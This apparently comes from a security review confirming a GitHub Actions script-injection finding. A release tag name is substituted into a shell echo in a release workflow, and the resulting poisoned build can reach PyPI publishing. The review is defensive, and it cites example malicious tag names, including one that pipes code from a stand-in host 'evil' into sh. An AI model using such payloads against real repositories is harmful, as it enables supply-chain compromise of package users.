GitHub Actions performs textual substitution of `${{ ... }}` expressions into the script BEFORE the shell parses it, so the substituted value becomes literal script text, not a quoted/escaped shell argument. `github.ref_name` for a `release: types: [published]` trigger is the release's tag name, which is only constrained by `git check-ref-format` (forbids space, control chars, `~^:?*[`, `..`, leading/trailing `.`/`/`, `@{`, backslash, and a bare `@` — it does NOT forbid backtick, `$`, `(`, `)`, `;`, `&`, `|`, or quote characters). A tag such as `` v1`touch pwned` `` or `v1$(curl evil|sh)` therefore survives as a legal git ref and, once substituted into line 25's double-quoted `echo "VERSION=..."`, is evaluated by bash: backtick and `$(...)` command substitution both fire inside double-quoted strings. This gives arbitrary command execution in the `release-build` runner. (The finding's line-31 payload description is slightly imprecise — it says the payload 'breaks out of the single-quoted string,' but the enclosing `echo "..."` is actually double-quoted, so a bare `'` doesn't terminate anything; the real vector at line 31 is identical backtick/`$(...)` substitution, which still works within the double-quoted context — the underlying vulnerability claim is unaffected by this imprecision.) The `release-build` job's `dist/` output is uploaded as an artifact and downloaded/published by the `pypi-publish` job (id-token: write, `pypi` environment, Trusted Publishing) at lines 45-66, so a poisoned wheel from the injection reaches PyPI. This matches the canonical, CodeQL-flagged (js/actions-command-injection) GitHub Actions script-injection anti-pattern precisely. The main mitigating factor — which the finding itself already states and factors into severity — is that triggering a `release: published` event requires repo write access, so this is an insider/compromised-account escalation rather than an anonymous/fork-PR vector; a user with that access could often tamper with the built artifact by other means (e.g. pushing malicious source to an unprotected branch/tag) without needing this injection. But that does not make the finding false: it remains a real, exploitable, best-practice-violating sink (env-map pattern trivially fixes it), and 'medium' is an appropriately calibrated severity — not inflated to critical/high despite the PyPI sink, and not dismissed to low/none despite the write-access gate. No mitigating control (SHA-pinning, environment manual-approval gate that inspects wheel contents, alternate safe interpolation) is present in the cited code to refute this. Confirmed as characterized, severity unchanged at medium.
